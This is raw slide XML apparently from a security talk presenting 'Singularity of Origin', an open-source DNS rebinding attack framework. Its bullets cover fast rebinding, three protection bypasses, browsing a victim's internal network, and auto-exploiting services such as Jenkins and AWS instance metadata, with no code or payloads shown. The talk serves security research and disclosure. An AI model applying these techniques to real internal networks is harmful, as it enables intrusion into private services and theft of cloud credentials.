              <a:rPr lang="en"/>
              <a:t>: Jenkins, Rails, AWS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Instance </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Metadata, etc...</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Autopwn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Networks &amp; services scan, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>service detection and auto-exploitation</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>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Contributions</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Google Shape;63;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4450650" y="1152475"/>
            <a:ext cx="4302600" cy="371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Neat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t> Technical Details/Techniques</a:t>
            </a:r>
            <a:endParaRPr u="sng"/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Speed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Multiple DNS answers and cache flooding </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Protection Bypasses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: 3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>different bypasses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> for common DNS rebinding protections</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Using DNS trickery</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Hook/Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> - Interactively browse the victim’s internal network</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Websocket proxying, no HTTP proxy needed!</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Refresher on DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>DNS Rebinding Attack: Building on reliable foundations</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>The Need for Speed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: DNS rebinding in 3 seconds</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Protection Bypasses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: 3 different bypasses for common DNS rebinding protections</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Hook and Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Interactively browse the victim’s internal network</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Scanning for Vulnerable Host Services</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Automation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Service detection &amp; exploitation and o</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>rchestrating all the above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3" name="Shape 73"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Google Shape;74;p1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Introduction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Who Are We</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="Google Shape;80;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1152475"/>
            <a:ext cx="5158500" cy="3342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Gérald Doussot and Roger Meyer</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Security consultants at </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>San Francisco, CA</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Authors of </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Singularity of Origin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS Rebinding Attack Framework</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://github.com/nccgroup/singularity</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81" name="Google Shape;81;p17"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3175774" y="1517750"/>
            <a:ext cx="1162800" cy="389800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="82" name="Google Shape;82;p17"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4938925" y="374750"/>
            <a:ext cx="3893275" cy="42687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Should You Care About DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="Google Shape;88;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2633100" y="2116375"/>
            <a:ext cx="3877800" cy="2400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4000"/>
              <a:t>b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="4000"/>
              <a:t>ind 0.0.0.0</a:t>
            </a:r>
            <a:endParaRPr sz="4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Should You Care About DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="Google Shape;94;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2633100" y="2116375"/>
            <a:ext cx="3877800" cy="2400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4000"/>
              <a:t>bind 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="4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Should You Care About DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="100" name="Google Shape;100;p20"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="253957" y="1575500"/>
            <a:ext cx="6567669" cy="34796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Should You Care About DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="106" name="Google Shape;106;p21"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="253957" y="1575500"/>
            <a:ext cx="6567669" cy="3479650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="107" name="Google Shape;107;p21"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="990951" y="658000"/>
            <a:ext cx="5252376" cy="40844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Should You Care About DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="113" name="Google Shape;113;p22"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="253957" y="1575500"/>
            <a:ext cx="6567669" cy="3479650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="114" name="Google Shape;114;p22"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="990951" y="658000"/>
            <a:ext cx="5252376" cy="4084401"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="115" name="Google Shape;115;p22"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1628001" y="0"/>
            <a:ext cx="6790501" cy="43362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Should You Care About DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="121" name="Google Shape;121;p23"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="253957" y="1575500"/>
            <a:ext cx="6567669" cy="3479650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="122" name="Google Shape;122;p23"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="990951" y="658000"/>
            <a:ext cx="5252376" cy="4084401"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="123" name="Google Shape;123;p23"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1628001" y="0"/>
            <a:ext cx="6790501" cy="4336200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="124" name="Google Shape;124;p23"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2254748" y="21250"/>
            <a:ext cx="6842076" cy="42937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Should You Care About DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="130" name="Google Shape;130;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="253957" y="1575500"/>
            <a:ext cx="6567669" cy="3479650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="131" name="Google Shape;131;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="990951" y="658000"/>
            <a:ext cx="5252376" cy="4084401"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="132" name="Google Shape;132;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1628001" y="0"/>
            <a:ext cx="6790501" cy="4336200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="133" name="Google Shape;133;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2254748" y="21250"/>
            <a:ext cx="6842076" cy="4293701"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="134" name="Google Shape;134;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1440065" y="851550"/>
            <a:ext cx="6978434" cy="40844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Should You Care About DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="140" name="Google Shape;140;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="253957" y="1575500"/>
            <a:ext cx="6567669" cy="3479650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="141" name="Google Shape;141;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="990951" y="658000"/>
            <a:ext cx="5252376" cy="4084401"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="142" name="Google Shape;142;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1628001" y="0"/>
            <a:ext cx="6790501" cy="4336200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="143" name="Google Shape;143;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2254748" y="21250"/>
            <a:ext cx="6842076" cy="4293701"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
